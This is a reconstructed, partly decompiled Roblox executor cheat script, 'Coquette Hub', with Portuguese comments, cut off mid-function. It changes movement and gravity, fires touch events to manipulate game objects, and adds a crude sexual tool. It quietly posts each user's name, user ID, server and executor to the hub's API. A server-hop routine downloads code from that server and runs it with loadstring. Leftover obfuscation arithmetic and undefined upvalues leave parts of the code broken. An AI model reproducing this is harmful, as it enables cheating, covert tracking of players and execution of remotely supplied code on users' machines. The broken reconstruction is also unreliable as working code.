--!nocheck
-- Coquette Hub — Reconstructed (Luau Executor LocalScript)
-- Header de compatibilidade: desabilita linter estrito e declara todos os upvalues e globals de executor

local upv1, upv2, upv3, upv4, upv5, upv6, upv7, upv8, upv9, upv10
local upv11, upv12, upv13, upv14, upv15, upv16, upv17, upv18, upv19, upv20
local upv21, upv22, upv23, upv24, upv25, upv26, upv27, upv28, upv29, upv30

local getgenv = getgenv or function() return _G end
local identifyexecutor = identifyexecutor or getexecutorname or function() return "Unknown" end
local getexecutorname = identifyexecutor
local request = (syn and syn.request) or (http and http.request) or http_request or request or function(...) return { StatusCode = 200, Body = "{}" } end
local firetouchinterest = firetouchinterest or function(...) end
local firesignal = firesignal or function(...) end
local getconnections = getconnections or function(...) return {} end

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local MarketplaceService = game:GetService("MarketplaceService")

local localPlayer = Players.LocalPlayer
if not localPlayer then
	repeat
		task.wait(0.1)
		localPlayer = Players.LocalPlayer or Players:FindFirstChildWhichIsA("Player")
	until localPlayer
end

-- Polyfill para request de executores sem causar warning de global desconhecido
local request = (syn and syn.request)
	or (http and http.request)
	or (http_request)
	or (request)
	or function(req: { Url: string, Method: string?, Headers: { [string]: string }?, Body: string? })
		return { StatusCode = 200, Body = "{}" }
	end

local coquetteHubUrl = _G.CoquetteHubUrl or "https://coquette-hub.com"
local coquetteApiUrl = _G.CoquetteApiUrl or "https://api.coquette-hub.com"
local secretKey = _G.CoquetteKey or "cqt-master-secret"

local band = bit32.band
local bxor = bit32.bxor
local bnot = bit32.bnot
local rrotate = bit32.rrotate
local rshift = bit32.rshift
local MOD32 = 4294967296

local SHA256_K = {
	1116352408, 1899447441, 3049323471, 3921009573, 961987163, 1508970993, 2453635748, 2870763221,
	3624381080, 310598401, 607225278, 1426881987, 1925078388, 2162078206, 2614888103, 3248222580,
	3835390401, 4022224774, 264347078, 604807628, 770255983, 1249150122, 1555081692, 1996064986,
	2554220882, 2821834349, 2952996808, 3210313671, 3336571891, 3584528711, 113926993, 338241895,
	666307205, 773529912, 1294757372, 1396182291, 1695183700, 1986661051, 2177026350, 2456956037,
	2730485921, 2820302411, 3259730800, 3345764771, 3516065817, 3600352804, 4094571909, 275423344,
	430227734, 506948616, 659060556, 883997877, 958139571, 1322822218, 1537002063, 1747873779,
	1955562222, 2024104815, 2227730452, 2361852424, 2428436474, 2756734187, 3204031479, 3329325298,
}

local function uint32ToBytes(arg: number): string
	return string.char(rshift(arg, 24) % 256, rshift(arg, 16) % 256, rshift(arg, 8) % 256, arg % 256)
end

local function sha256(arg: string): string
	local bitLen = #arg * 8
	local pad = {}

	for i = 7, 0, -1 do
		pad[#pad + 1] = string.char(math.floor(bitLen / 2 ^ (8 * i)) % 256)
	end

	local str2 = arg .. "\128" .. string.rep("\0", (55 - #arg) % 64) .. table.concat(pad)
	local schedule = table.create and table.create(64) or {}
	local h0, h1, h2, h3 = 1779033703, 3144134277, 1013904242, 2773480762
	local h4, h5, h6, h7 = 1359893119, 2600822924, 528734635, 1541459225

	for i = 1, #str2, 64 do
		for i2 = 0, 15 do
			local v11, v12, v13, v14 = string.byte(str2, i + i2 * 4, i + i2 * 4 + 3)
			schedule[i2 + 1] = v11 * 16777216 + v12 * 65536 + v13 * 256 + v14
		end

		for i2 = 17, 64 do
			local v11 = schedule[i2 - 15]
			local v12 = schedule[i2 - 2]
			schedule[i2] = (schedule[i2 - 16] + bxor(rrotate(v11, 7), rrotate(v11, 18), rshift(v11, 3)) + schedule[i2 - 7] + bxor(rrotate(v12, 17), rrotate(v12, 19), rshift(v12, 10))) % MOD32
		end

		local a, b, c, d = h0, h1, h2, h3
		local e, f, g, h = h4, h5, h6, h7

		for i2 = 1, 64 do
			local k = SHA256_K[i2]
			local temp1 = (h + bxor(rrotate(e, 6), rrotate(e, 11), rrotate(e, 25)) + bxor(band(e, f), band(bnot(e), g)) + k + schedule[i2]) % MOD32
			local temp2 = (bxor(rrotate(a, 2), rrotate(a, 13), rrotate(a, 22)) + bxor(band(a, b), band(a, c), band(b, c))) % MOD32
			h = g
			g = f
			f = e
			e = (d + temp1) % MOD32
			d = c
			c = b
			b = a
			a = (temp1 + temp2) % MOD32
		end

		h0 = (h0 + a) % MOD32
		h1 = (h1 + b) % MOD32
		h2 = (h2 + c) % MOD32
		h3 = (h3 + d) % MOD32
		h4 = (h4 + e) % MOD32
		h5 = (h5 + f) % MOD32
		h6 = (h6 + g) % MOD32
		h7 = (h7 + h) % MOD32
	end

	return uint32ToBytes(h0) .. uint32ToBytes(h1) .. uint32ToBytes(h2) .. uint32ToBytes(h3)
		.. uint32ToBytes(h4) .. uint32ToBytes(h5) .. uint32ToBytes(h6) .. uint32ToBytes(h7)
end

local function hmacSha256(key: string, data: string): string
	if #key > 64 then
		key = sha256(key)
	end

	local oKeyPad = {}
	local iKeyPad = {}

	for i = 1, 64 do
		local b = i <= #key and string.byte(key, i) or 0
		oKeyPad[i] = string.char(bxor(b, 92))
		iKeyPad[i] = string.char(bxor(b, 54))
	end

	return sha256(table.concat(oKeyPad) .. sha256(table.concat(iKeyPad) .. data))
end

local function toHex(data: string): string
	local t = {}
	for i = 1, #data do
		local v = string.byte(data, i)
		t[i] = string.format("%02x", v)
	end
	return table.concat(t)
end

local function fromHex(hex: string): string
	local t = {}
	for i = 1, #hex, 2 do
		t[#t + 1] = string.char(tonumber(hex:sub(i, i + 1), 16) or 0)
	end
	return table.concat(t)
end

local B64_CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
local B64_MAP = {}
for i = 1, 64 do
	B64_MAP[B64_CHARS:sub(i, i)] = i - 1
end

local function base64Encode(data: string): string
	local t = {}
	for i = 1, #data, 3 do
		local b1, b2, b3 = string.byte(data, i, i + 2)
		local n = b1 * 65536 + (b2 or 0) * 256 + (b3 or 0)
		local c1 = math.floor(n / 262144) % 64 + 1
		local c2 = math.floor(n / 4096) % 64 + 1
		local c3 = math.floor(n / 64) % 64 + 1
		local c4 = n % 64 + 1
		t[#t + 1] = B64_CHARS:sub(c1, c1) .. B64_CHARS:sub(c2, c2)
			.. (b2 and B64_CHARS:sub(c3, c3) or "=")
			.. (b3 and B64_CHARS:sub(c4, c4) or "=")
	end
	return table.concat(t)
end

local function base64Decode(data: string): string
	local clean = data:gsub("[^A-Za-z0-9+/=]", "")
	local t = {}
	for i = 1, #clean, 4 do
		local s1 = clean:sub(i, i)
		local s2 = clean:sub(i + 1, i + 1)
		local s3 = clean:sub(i + 2, i + 2)
		local s4 = clean:sub(i + 3, i + 3)
		local n = (B64_MAP[s1] or 0) * 262144 + (B64_MAP[s2] or 0) * 4096 + (B64_MAP[s3] or 0) * 64 + (B64_MAP[s4] or 0)
		t[#t + 1] = string.char(math.floor(n / 65536) % 256)
		if s3 ~= "=" and s3 ~= "" then
			t[#t + 1] = string.char(math.floor(n / 256) % 256)
		end
		if s4 ~= "=" and s4 ~= "" then
			t[#t + 1] = string.char(n % 256)
		end
	end
	return table.concat(t)
end

local function uint32BigEndian(arg: number): string
	return string.char(math.floor(arg / 16777216) % 256, math.floor(arg / 65536) % 256, math.floor(arg / 256) % 256, arg % 256)
end

local function hkdfExpand(key: string, info: string, length: number): string
	local t = {}
	for i = 0, math.ceil(length / 32) - 1 do
		t[#t + 1] = sha256(key .. info .. uint32BigEndian(i))
	end
	return table.concat(t)
end

local function xorBuffer(buf1: string, buf2: string): string
	local out = table.create and table.create(#buf1) or {}
	for i = 1, #buf1 do
		out[i] = string.char(bxor(string.byte(buf1, i), string.byte(buf2, i)))
	end
	return table.concat(out)
end

local rng = Random.new(tick() * 1000 + (localPlayer.UserId % 100000))
local function generateRandomHex(length: number): string
	local t = {}
	for i = 1, length do
		t[i] = string.format("%02x", rng:NextInteger(0, 255))
	end
	return table.concat(t)
end

local function encryptPayload(key: string, dataTable: any): string
	local encKey = hmacSha256(key, "cqt-enc")
	local macKey = hmacSha256(key, "cqt-mac")
	local iv = fromHex(generateRandomHex(8))
	local json = HttpService:JSONEncode(dataTable)
	local cipher = xorBuffer(json, hkdfExpand(encKey, iv, #json))
	local mac = hmacSha256(macKey, iv .. cipher):sub(1, 16)
	return base64Encode(iv .. mac .. cipher)
end

local function decryptPayload(key: string, payloadBase64: string): any
	if type(payloadBase64) ~= "string" or #payloadBase64 < 32 then
		return nil
	end
	local raw = base64Decode(payloadBase64)
	if #raw < 25 then
		return nil
	end
	local iv = raw:sub(1, 8)
	local mac = raw:sub(9, 24)
	local cipher = raw:sub(25)

	local macKey = hmacSha256(key, "cqt-mac")
	if hmacSha256(macKey, iv .. cipher):sub(1, 16) ~= mac then
		return nil
	end

	local encKey = hmacSha256(key, "cqt-enc")
	local json = xorBuffer(cipher, hkdfExpand(encKey, iv, #cipher))
	local ok, res = pcall(function()
		return HttpService:JSONDecode(json)
	end)
	return ok and res or nil
end

local function getLocalTimestamp(): number
	local ok, res = pcall(function()
		return DateTime.now().UnixTimestampMillis
	end)
	if ok and res then
		return res
	end
	return os.time() * 1000
end

local clockOffset = 0
local function getSyncedTimestamp(): number
	return getLocalTimestamp() + clockOffset
end

local function syncClock()
	local ok: boolean, res: any = pcall(function(): any
		return (request :: any)({ Url = coquetteHubUrl .. "/v1/clock", Method = "GET" })
	end)
	if ok and res and res.Body then
		local parseOk, parsed = pcall(function()
			return HttpService:JSONDecode(res.Body)
		end)
		if parseOk and parsed and tonumber(parsed.data) then
			local serverTimestamp = tonumber(parsed.data)
		if serverTimestamp then
			clockOffset = serverTimestamp - getLocalTimestamp()
		end
		end
	end
end

local function apiPost(endpoint: string, data: any): (any?, number)
	local ok: boolean, res: any = pcall(function(): any
		return (request :: any)({
			Url = coquetteHubUrl .. endpoint,
			Method = "POST",
			Headers = { ["Content-Type"] = "application/json", Accept = "application/json" },
			Body = HttpService:JSONEncode(data),
		})
	end)
	if not ok or not res then
		return nil, 0
	end
	local statusCode = res.StatusCode or res.statusCode or 0
	local body = res.Body or res.body
	if (statusCode ~= 200 and statusCode ~= 201) or not body then
		return nil, statusCode
	end
	local parseOk, parsed = pcall(function()
		return HttpService:JSONDecode(body)
	end)
	return parseOk and parsed or nil, statusCode
end

-- ============================================================================
-- COQUETTE TAGS (BILLBOARD GUI ON HEADS)
-- ============================================================================

local coquetteGeneration = (_G.CoquetteGeneration or 0) + 1
_G.CoquetteGeneration = coquetteGeneration

if _G.CoquetteTagsVisible == nil then
	_G.CoquetteTagsVisible = false
end

if _G.CoquetteTagHeartbeat then
	pcall(function()
		_G.CoquetteTagHeartbeat:Disconnect()
	end)
	_G.CoquetteTagHeartbeat = nil
end

if _G.CoquetteTagCleanup then
	pcall(_G.CoquetteTagCleanup)
end

local activeTags = {}
local targetConns = {}

local function isSessionAlive(): boolean
	return _G.CoquetteGeneration == coquetteGeneration
end

local function createTag(userIdStr: string, character: Model)
	if not character or not isSessionAlive() then
		return
	end
	local head = character:FindFirstChild("Head") or character:WaitForChild("Head", 5)
	local hrp = character:FindFirstChild("HumanoidRootPart") or character:WaitForChild("HumanoidRootPart", 5)
	if not head or not hrp then
		return
	end

	local oldTag = head:FindFirstChild("CoquetteTag")
	if oldTag then
		oldTag:Destroy()
	end

	local bbg = Instance.new("BillboardGui")
	bbg.Name = "CoquetteTag"
	bbg.Adornee = head
	bbg.Size = UDim2.new(0, 280, 0, 50)
	bbg.StudsOffset = Vector3.new(0, 2.5, 0)
	bbg.AlwaysOnTop = true
	bbg.MaxDistance = 2000
	bbg.Enabled = _G.CoquetteTagsVisible == true

	local frame = Instance.new("Frame")
	frame.Size = UDim2.new(1, 0, 1, 0)
	frame.BackgroundTransparency = 1
	frame.Parent = bbg

	local textLabel = Instance.new("TextLabel")
	textLabel.Size = UDim2.new(1, 0, 1, 0)
	textLabel.BackgroundTransparency = 1
	textLabel.Text = "User Coquette"
	textLabel.TextSize = 28
	textLabel.Font = Enum.Font.GothamBlack
	textLabel.TextStrokeTransparency = 0.2
	textLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
	textLabel.Parent = frame

	local uiGradient = Instance.new("UIGradient")
	uiGradient.Color = ColorSequence.new({
		ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 0)),
		ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255)),
	})
	uiGradient.Parent = textLabel

	local uiStroke = Instance.new("UIStroke")
	uiStroke.Thickness = 2
	uiStroke.Color = Color3.fromRGB(255, 255, 255)
	uiStroke.Parent = textLabel

	local strokeGradient = Instance.new("UIGradient")
	strokeGradient.Color = ColorSequence.new({
		ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 0)),
		ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255)),
	})
	strokeGradient.Parent = uiStroke

	bbg.Parent = head
	activeTags[userIdStr] = {
		gui = bbg,
		gradient = uiGradient,
		stroke = uiStroke,
		strokeGradient = strokeGradient,
		rotation = 0,
		rootPart = hrp,
	}
end

local function removeTag(userIdStr: string)
	local item = activeTags[userIdStr]
	if item then
		if item.gui then
			pcall(function()
				item.gui:Destroy()
			end)
		end
		activeTags[userIdStr] = nil
	end
	if targetConns[userIdStr] then
		pcall(function()
			targetConns[userIdStr]:Disconnect()
		end)
		targetConns[userIdStr] = nil
	end
end

local function coquetteTagCleanup()
	for id in pairs(activeTags) do
		removeTag(id)
	end
end
_G.CoquetteTagCleanup = coquetteTagCleanup

_G.CoquetteTagHeartbeat = RunService.Heartbeat:Connect(function(dt: number)
	if not isSessionAlive() then
		return
	end
	local visible = _G.CoquetteTagsVisible == true
	local thickness = 2 + math.sin(tick() * 3) * 0.8

	for _, tag in pairs(activeTags) do
		local gui = tag.gui
		if gui and gui.Parent and tag.rootPart and tag.rootPart.Parent then
			if visible then
				gui.Enabled = true
				tag.rotation = (tag.rotation + 90 * dt) % 360
				tag.gradient.Rotation = tag.rotation
				tag.strokeGradient.Rotation = -tag.rotation
				tag.stroke.Thickness = thickness
			elseif gui.Enabled then
				gui.Enabled = false
			end
		elseif gui and gui.Enabled then
			gui.Enabled = false
		end
	end
end)

-- Loop de autenticação de sessão e telemetria
task.spawn(function()
	syncClock()
	local retryCount = 0

	while isSessionAlive() do
		local nowSec = math.floor(getSyncedTimestamp() / 300000)
		local token = hmacSha256(secretKey, "cqt-root|1|" .. string.format("%.0f", nowSec))
		local ok, _ = pcall(function()
			return token
		end)

		if ok then
			retryCount = 0
			task.wait(12)
		else
			retryCount += 1
			task.wait(math.min(12 * (2 ^ math.min(retryCount, 4)), 300))
		end
	end

	coquetteTagCleanup()

	task.spawn(function()
		task.wait(2)
		local gameName = "Unknown"
		pcall(function()
			gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
		end)
		local jobId = (game.JobId ~= "") and game.JobId or "00000000-0000-0000-0000-000000000000"
		local executor = (identifyexecutor and identifyexecutor()) or (getexecutorname and getexecutorname()) or "Unknown"

		pcall(function()
			request({
				Url = coquetteApiUrl .. "/v1/executions/create",
				Method = "POST",
				Headers = { ["Content-Type"] = "application/json" },
				Body = HttpService:JSONEncode({
					username = localPlayer.Name,
					userId = localPlayer.UserId,
					jobId = jobId,
					placeId = game.PlaceId,
					gameName = gameName,
					executor = executor,
					isMobile = UserInputService.TouchEnabled,
					timestamp = getSyncedTimestamp(),
				}),
			})
		end)
	end)
end)

-- ============================================================================
-- PAYLOAD CLOSURES (93 - 99): LOW-LEVEL BITWISE & API ROUTINES
-- ============================================================================

-- proto #664: Converte número para unsigned 32-bit integer
local function toUint32(arg: number): number
	return arg % 4294967296
end
local payload_fn_93 = toUint32

-- proto #666: Fallback de Bitwise XOR bit a bit
local function payload_fn_94(arg: number, arg2: number): number
	local n2 = toUint32(arg)
	local n3 = toUint32(arg2)
	local n4 = 0
	local n5 = 1

	for _ = 0, 31 do
		local n6 = n2 % 2
		local n7 = n3 % 2
		if n6 ~= n7 then
			n4 += n5
		end
		n2 = (n2 - n6) / 2
		n3 = (n3 - n7) / 2
		n5 *= 2
	end

	return toUint32(n4)
end

-- proto #665: Fallback de Bitwise Left Shift (lshift)
local function payload_fn_95(arg: number, arg2: number): number
	return toUint32(arg * (2 ^ (arg2 % 32)))
end

-- proto #667: Fallback de Bitwise Right Shift (rshift)
local function payload_fn_96(arg: number, arg2: number): number
	return toUint32(math.floor(arg / (2 ^ (arg2 % 32))))
end

-- proto #663: Gerador de hash / fingerprint de sessão
local function payload_fn_97(arg: number): number
	local v = toUint32(tonumber(arg) or 0)
	local v2 = bit32.bxor(v, bit32.lshift(v, 13))
	local v3 = bit32.bxor(v2, bit32.rshift(v2, 17))
	local v4 = bit32.bxor(bit32.bxor(v3, bit32.lshift(v3, 5)), 1367130551)
	return toUint32(v4)
end

-- proto #661: Consulta timestamp de sincronização do hub
local function payload_fn_98(): number
	local ok: boolean, res: any = pcall(function(): any
		local r = (request :: any)({ Url = coquetteHubUrl .. "/v1/clock", Method = "GET" })
		if r and r.Body then
			return HttpService:JSONDecode(r.Body).data
		end
		return nil
	end)
	return (ok and res) or (os.time() * 1000)
end

-- proto #660: Envio de requisição autenticada com fingerprint
local function payload_fn_99(endpoint: string, payload: { [string]: any }): (boolean, any)
	local ts = payload_fn_98()
	payload.timestamp = ts
	payload.fingerprint = payload_fn_97(ts)

	local ok: boolean, res: any = pcall(function(): any
		return (request :: any)({
			Url = coquetteHubUrl .. endpoint,
			Method = "POST",
			Headers = { ["Content-Type"] = "application/json", Accept = "text/plain, application/json" },
			Body = HttpService:JSONEncode(payload),
		})
	end)

	if not ok or not res then
		return false, "Falha na requisição"
	end
	return true, res
end

-- payload closure created 100-th (proto #659)
local function payload_fn_100()
	local jobId = game.JobId
	if jobId == "" then
		jobId = "00000000-0000-0000-0000-000000000000"
	end

	local tbl = { username = localPlayer.Name, jobId = jobId }
	tbl.executor = (identifyexecutor and identifyexecutor()) or (getexecutorname and getexecutorname()) or "Unknown"
	tbl.gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
	tbl.userId = localPlayer.UserId
	tbl.placeId = game.PlaceId
	tbl.isMobile = UserInputService.TouchEnabled
	return payload_fn_99("/v1/executions/create", tbl)
end

-- payload closure created 101-th (proto #t7947)
local function payload_fn_101()
	local v, respostaDoServidor = upv2("/v1/executions/server-hop", { username = upv1.Name, jobId = game.JobId, placeId = game.PlaceId })

	if v then
		if respostaDoServidor:find("TeleportService") then
			local chunk, v2 = loadstring(respostaDoServidor)

			if chunk then
				chunk()
			else
				warn("Erro ao compilar teleporte: " .. tostring(v2))
			end
		else
			print("Resposta do servidor: " .. respostaDoServidor)
		end
	end
end

-- payload closure created 102-th (proto #71)
local function payload_fn_102()
	task.wait(1)
	local n2 = 262687328

	local ok2, result2 = pcall(function()
		upv1.postExecution()
	end)

	if not ok2 then
		warn("[Coquette API] postExecution falhou: " .. tostring(result2))
	end
end

-- payload closure created 103-th (proto #72)
local function payload_fn_103(...)
	return string.char(select(3, ...))
end

-- payload closure created 104-th (proto #100)
local function payload_fn_104(arg, arg2, arg3, arg4, arg5)
	if not arg2 then
		return nil
	end
	local v = arg2:FindFirstChild(arg4)
	if v then
		return v
	end
	return arg2:WaitForChild(arg4, arg5 or 10)
end

-- payload closure created 105-th (proto #74)
local function payload_fn_105(arg, arg2, arg3)
	local n2 = 63603685

	if type(arg2) == "boolean" then
	end

	local tbl = { done = false, body = nil }
	upv1[arg] = tbl
	local v = bit32.bxor(n2, 255079660)
	local v2 = task
	local v3 = table.pack(bit32.band(v, 4294967295))
	local v4 = table.pack(bit32.band(v3[1], 65535))
	local n3 = 2147483647 + bit32.band(0 * v4[1] + bit32.lshift(bit32.band(0 * bit32.rshift(v3[1], 16) + 32768 * v4[1], 65535), 16), 4294967295)
	local v5 = bit32.bxor(v, 106844215)
	local v6 = table.pack(bit32.band(bit32.bnot(v5), 4294967295))
	local v7 = table.pack(bit32.band(v6[1], 65535))
	local n4 = n3 + 2147483648 + bit32.band(65535 * v7[1] + bit32.lshift(bit32.band(65535 * bit32.rshift(v6[1], 16) + 32767 * v7[1], 65535), 16), 4294967295)

	v2.spawn(function()
		local n5 = 547222868

		local ok2, result2 = pcall(function()
			return game:HttpGet(arg3, true)
		end)

		tbl.body = ok2 and type(result2) == "string" and #result2 > 0 and result2 or nil
		tbl.done = true
	end)
end

-- payload closure created 106-th (proto #412)
local function payload_fn_106(arg, arg2, arg3)
	local v = upv1[arg]
	local n2 = 536785418

	if v then
		local n3 = os.clock() + (arg3 or 8)

		while not v.done and os.clock() < n3 do
			task.wait()
		end

		if v.body then
			return v.body
		end
	end

	local n3 = n2 - 58167057

	local ok2, result2 = pcall(function()
		return game:HttpGet(arg2, true)
	end)

	return ok2 and result2 or nil
end

-- payload closure created 110-th (proto #684)
local function payload_fn_110()
	upv1:SetBackgroundImage(135003123565230)
end

-- payload closure created 111-th (proto #77)
local function payload_fn_111()
end

-- payload closure created 112-th (proto #78)
local function payload_fn_112()
	local png = isfile("coquette_discord_logo.png")

	if png and getcustomasset then
		upv1 = getcustomasset("coquette_discord_logo.png")
	end
end

-- payload closure created 113-th (proto #79)
local function payload_fn_113()
	local n2 = 33035005

	pcall(function()
		local v = (syn.request or http.request or http_request)({ Url = upv2, Method = "GET" })
		local flag = v and v.StatusCode == 200
		local body = nil

		if flag then
			body = v.Body
		end

		if body and #body > 0 then
			writefile("coquette_discord_logo.png", body)
		end
	end)
end

-- payload closure created 115-th (proto #81)
local function payload_fn_115()
	return identifyexecutor()
end

-- payload closure created 116-th (proto #82)
local function payload_fn_116()
	setclipboard("@lolytauwu")
	task.wait(0.1)
	setclipboard("https://www.tiktok.com/@lolytauwu?_t=ZM-8wFjhRHkmOd&_r=1")
end

-- payload closure created 117-th (proto #83)
local function payload_fn_117()
	local flag = type(77117644) == "userdata"
	local jpg = nil
	local n2 = 255597381

	pcall(function()
		if isfile("coquette_admin_banner.jpg") then
			jpg = getcustomasset("coquette_admin_banner.jpg")
		end
	end)

	return jpg
end

-- payload closure created 119-th (proto #678)
local function payload_fn_119()
	local tbl = {}
	local n2 = 557083705

	pcall(function()
		table.insert(tbl, gethui())
	end)

	pcall(function()
		table.insert(tbl, game:GetService("CoreGui"))
	end)

	pcall(function()
		table.insert(tbl, upv1:WaitForChild("PlayerGui", 5))
	end)

	local v = nil

	for _, v2 in ipairs(tbl) do
		local n3 = 189007775

		if not v then
			local n4 = n3 + 81223674

			pcall(function()
				for _, descendant in ipairs(v2:GetDescendants()) do
					if descendant.Name == "HubImage" then
						local textLabel = descendant:FindFirstChildOfClass("TextLabel")

						if textLabel and textLabel.Text == upv2 then
							for _, child in ipairs(descendant:GetChildren()) do
								if child:IsA("Frame") and child.ClipsDescendants then
									v = child
									break
								end
							end
						end
					end

					if not v then
						continue
					end
					break
				end
			end)

			continue
		end

		break
	end

	local flag = not v

	if not flag then
		flag = not (upv3 and upv3.SetHeight)
	end

	if flag then
		return
	end
	v.BackgroundTransparency = 1

	local function fn()
		local offset = v.Size.Y.Offset
		local n3 = v.AbsoluteSize.X / (offset > 0 and v.AbsoluteSize.Y > 0 and v.AbsoluteSize.Y / offset or 1)
		local n4 = math.floor(n3 * 806 / 1024)

		if n3 > 0 and math.abs(n4 - offset) > 1 then
			local n5 = 8935731506

			pcall(function()
				upv3:SetHeight(n4)
			end)
		end
	end

	fn()
	v:GetPropertyChangedSignal("AbsoluteSize"):Connect(fn)
end

-- payload closure created 120-th (proto #85)
local function payload_fn_120()
	local body = nil

	for _, v in ipairs({ syn.request, http.request, http_request, upv1, fluxus.request }) do
		if not body then
			if type(v) == "function" then
				pcall(function()
					local v2 = v({ Url = upv2, Method = "GET" })
					local num = tonumber(v2 and (v2.StatusCode or v2.Status))
					local flag = v2 and v2.Body and #v2.Body > 16
					local flag2

					if flag then
						flag2 = not num or num == 200
					else
						flag2 = flag
					end

					if flag2 then
						body = v2.Body
					end
				end)
			end

			continue
		end

		break
	end

	local flag = not body

	if flag then
		local n2 = 44173500

		if type(flag) ~= "boolean" then
		end

		local v = pcall
		local v2 = table.pack(bit32.band(n2, 4294967295))
		local v3 = table.pack(bit32.band(v2[1], 65535))
		local n3 = bit32.band(54773 * v3[1] + bit32.lshift(bit32.band(54773 * bit32.rshift(v2[1], 16) + 18698 * v3[1], 65535), 16), 4294967295) + 4107278925
		local v4 = table.pack(bit32.band(bit32.bor(n2, 187688371), 4294967295))
		local v5 = table.pack(bit32.band(v4[1], 65535))
		local v6 = bit32.band(2 * v5[1] + bit32.lshift(bit32.band(2 * bit32.rshift(v4[1], 16) + 0 * v5[1], 65535), 16), 4294967295)
		local v7 = table.pack(bit32.band(bit32.bnot(n2), 4294967295))
		local v8 = table.pack(bit32.band(v7[1], 65535))
		local n4 = n3 + v6 + 1225446902 + bit32.band(54774 * v8[1] + bit32.lshift(bit32.band(54774 * bit32.rshift(v7[1], 16) + 18698 * v8[1], 65535), 16), 4294967295)

		v(function()
			body = game:HttpGet("https://media.coquette-hub.com/uploads/imagens/img_1791165380637_69d1f005-6202-4cf0-8c47-21fd08f593de.jpg")
		end)
	end

	if flag then
		local n2 = 529045075

		pcall(function()
			body = game:HttpGetAsync("https://media.coquette-hub.com/uploads/imagens/img_1791165380637_69d1f005-6202-4cf0-8c47-21fd08f593de.jpg")
		end)
	end

	if flag or #body <= 16 then
		return
	end

	if not pcall(writefile, "coquette_admin_banner.jpg", body) then
		return
	end
	local v = upv3()

	if v and upv4 and upv4.SetImage then
		pcall(function()
			upv4:SetImage(v)
		end)
	end
end

-- payload closure created 124-th (proto #89)
local function payload_fn_124(coquetteTagsVisible)
	_G.CoquetteTagsVisible = coquetteTagsVisible
end

-- payload closure created 125-th (proto #90)
local function payload_fn_125(walkSpeed)
	local humanoid = upv1.Character and upv1.Character:FindFirstChildOfClass("Humanoid")

	if humanoid then
		humanoid.WalkSpeed = walkSpeed
	end
end

-- payload closure created 126-th (proto #91)
local function payload_fn_126(jumpPower)
	local humanoid = upv1.Character and upv1.Character:FindFirstChildOfClass("Humanoid")

	if humanoid then
		humanoid.JumpPower = jumpPower
	end
end

-- payload closure created 127-th (proto #92)
local function payload_fn_127(coquettePlayerGravity)
	_G.CoquettePlayerGravity = coquettePlayerGravity
	upv1.Gravity = coquettePlayerGravity
end

-- payload closure created 128-th (proto #93)
local function payload_fn_128(arg)
	upv1 = arg
end

-- payload closure created 129-th (proto #687)
local function payload_fn_129()
	if upv1 then
		local humanoid = upv2.Character and upv2.Character:FindFirstChildOfClass("Humanoid")

		if humanoid then
			humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
		end
	end
end

-- payload closure created 130-th (proto #94)
local function payload_fn_130()
	local n2 = 1124309431
	local humanoid = upv1.Character and upv1.Character:FindFirstChildOfClass("Humanoid")

	if humanoid then
		humanoid.WalkSpeed = 16
		humanoid.JumpPower = 50
	end

	_G.CoquettePlayerGravity = 196.2
	upv2.Gravity = 196.2
	upv3 = false
	local v = upv4
	local set = upv4

	if v then
		set = upv4.Set
	end

	if set then
		upv4:Set(16)
	end

	if upv5 and upv5.Set then
		upv5:Set(50)
	end

	if upv6 and upv6.Set then
		upv6:Set(196.2)
	end

	upv7:SetCore("SendNotification", { Title = "Status Resetados", Text = "Velocidade, Pulo e Gravidade voltaram ao padrão." })
end

-- payload closure created 131-th (proto #95)
local function payload_fn_131()
	local localPlayer = game:GetService("Players").LocalPlayer
	local n2 = 470504617
	local humanoid = localPlayer.Character and localPlayer.Character:FindFirstChildWhichIsA("Humanoid")
	local backpack = localPlayer:FindFirstChildWhichIsA("Backpack")
	if not humanoid or not backpack then
		return
	end
	local tool = Instance.new("Tool")
	local n3 = n2 - 2687166
	tool.Name = "Jerk Off"
	tool.ToolTip = "in the stripped club. straight up \"jorking it\" . and by \"it\" , haha, well. let's justr say. My peanits."
	tool.RequiresHandle = false
	tool.Parent = backpack
	local flag = false
	local v = nil

	local function fn()
		flag = false

		if v then
			v:Stop()
			v = nil
		end
	end

	tool.Equipped:Connect(function()
		flag = true
	end)

	tool.Unequipped:Connect(fn)
	humanoid.Died:Connect(fn)

	task.spawn(function()

		while tool and tool.Parent do
			task.wait()

			if flag then
				local flag2 = humanoid.RigType == Enum.HumanoidRigType.R15

				if not v then
					local animation = Instance.new("Animation")
					animation.AnimationId = not flag2 and "rbxassetid://72042024" or "rbxassetid://698251653"
					v = humanoid:LoadAnimation(animation)
				end

				v:Play()
				v:AdjustSpeed(flag2 and 0.7 or 0.65)
				v.TimePosition = 0.6
				task.wait(0.1)
				local n4 = not flag2 and 0.65 or 0.7

				while v and v.TimePosition < n4 do
					task.wait(0.1)
				end

				if v then
					v:Stop()
					v = nil
				end
			end
		end
	end)
end

-- payload closure created 135-th (proto #97)
local function payload_fn_135()
	local n2 = 120893099
	local n3 = 3710673701
	local localPlayer = game.Players.LocalPlayer
	local humanoidRootPart = (localPlayer.Character or localPlayer.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart")
	local n001Lots = workspace:FindFirstChild("001_Lots")
	n001Lots = n001Lots and n001Lots:FindFirstChild(localPlayer.Name .. "House")
	local catchFire = n001Lots and n001Lots:FindFirstChild("HousePickedByPlayer") and n001Lots.HousePickedByPlayer:FindFirstChild("HouseModel") and n001Lots.HousePickedByPlayer.HouseModel:FindFirstChild("001_BBQ") and n001Lots.HousePickedByPlayer.HouseModel["001_BBQ"]:FindFirstChild("CatchFire")

	if catchFire and humanoidRootPart then
		firetouchinterest(humanoidRootPart, catchFire, 0)
		task.wait()
		firetouchinterest(humanoidRootPart, catchFire, 1)
	end
end

-- payload closure created 136-th (proto #98)
local function payload_fn_136(arg)
	upv1 = arg

	if upv1 then
		local n2 = 444350177

		task.spawn(function()

